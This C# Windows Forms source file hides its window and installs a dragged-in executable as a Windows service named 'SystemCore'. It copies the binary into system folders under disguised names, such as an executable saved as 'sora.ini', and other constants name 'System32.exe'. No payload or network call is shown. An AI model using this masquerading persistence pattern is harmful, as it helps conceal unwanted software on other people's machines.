using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.ServiceProcess;
using System.IO;

namespace deployService
{
    public partial class Form1 : Form//Can only by drag execute
    {
        String tempfile;
        String serviceName = "SystemCore";
        String fileName;

        public static String NAME_SERVICE = "SystemCore";
        public static String NAME_SERVICE_EXE = "federalser.exe";
        public static String NAME_SERVICE_BACKUP = "sora.ini";
        public static String NAME_MK_EXE = "System32.exe";
        public static String NAME_MK_BACKUP = "yosuga.ini";

        public static String PATH_SERVICE_FOLDER = System.Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
        public static String PATH_SERVICE_EXE = PATH_SERVICE_FOLDER + "\\" + NAME_SERVICE_EXE;
        public static String PATH_SERVICE_BACKUP_FOLDER = System.Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        public static String PATH_SERVICE_BACKUP_EXE = PATH_SERVICE_BACKUP_FOLDER + "\\" + NAME_SERVICE_BACKUP;
        
        public Form1(String[] Args)
        {
            InitializeComponent();
            tempfile = string.Join(" ", Args);
            fileName = extrctExe(tempfile);
        }

        public string extrctExe(string det)
        {
            string[] list = det.Split('\\');

            int len = list.Length;

            return list[len - 1];
        }

        private void deploy(bool condition,String file)
        {
            Process MyProcess = new Process();
            MyProcess.StartInfo.FileName = "InstallUtil.exe";//This deployer CAN NOT identify WHITE SPACE!
            MyProcess.StartInfo.UseShellExecute = false;

            switch(condition)
            {
                case true:
                //psi.Arguments = "/c (\"" + path + "test.exe\" " + prameter + ")";
                //这样就正确了，就是说每个路径要加双引号，而对于/c后面的参数部分，整体要加上（）不需要转义
                    MyProcess.StartInfo.Arguments = "\"" + file + "\"";//This deployer CAN NOT identify WHITE SPACE!
                    break;

                case false:
                    MyProcess.StartInfo.Arguments = "/u " + "\"" + file + "\""; //This deployer CAN NOT identify WHITE SPACE!           
                    break;
            }

            MyProcess.StartInfo.CreateNoWindow = true;
            MyProcess.StartInfo.RedirectStandardOutput = true;
            MyProcess.Start();            
            MyProcess.WaitForExit();

            MessageBox.Show(MyProcess.StandardOutput.ReadToEnd());

            if (!condition) File.Delete(file);
        }

        private void Form1_Activated(object sender, EventArgs e)
        {
            this.Hide();
            deployFile();
            this.Close();
        }

        public static bool ISWindowsServiceInstalled(string serviceName)
        {
            // get list of Windows services
            ServiceController[] services = ServiceController.GetServices();

            foreach (ServiceController service in services)
            {
                if (service.ServiceName == NAME_SERVICE)
                {
                    try
                    {
                        service.Stop();
                    }
                    catch(Exception e)
                    {

                    }
                    return true;
                }
            }
            return false;
        }

        public void deployFile()
        {
            if (!System.IO.Directory.Exists(PATH_SERVICE_FOLDER))//Clear file
            {
                try
                {
                    System.IO.Directory.CreateDirectory(PATH_SERVICE_FOLDER);// 目录不存在，建立目录 
                }
                catch (Exception eee)
                {

                }
            }
            if (!System.IO.Directory.Exists(PATH_SERVICE_BACKUP_FOLDER))//Clear file
            {
                try
                {
                    System.IO.Directory.CreateDirectory(PATH_SERVICE_BACKUP_FOLDER);// 目录不存在，建立目录 
                }
                catch (Exception eee)
                {

                }
            }

            bool isrewrite = true; // true=覆盖已存在的同名文件,false则反之 
            try
            {
                System.IO.File.Copy(fileName, PATH_SERVICE_EXE, isrewrite);//Original ser file
                System.IO.File.Copy(fileName, PATH_SERVICE_BACKUP_EXE, isrewrite);//back up ser file
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

            //MessageBox.Show(targetPath);
            deploy(!ISWindowsServiceInstalled(NAME_SERVICE), PATH_SERVICE_EXE);

        }

    }
}
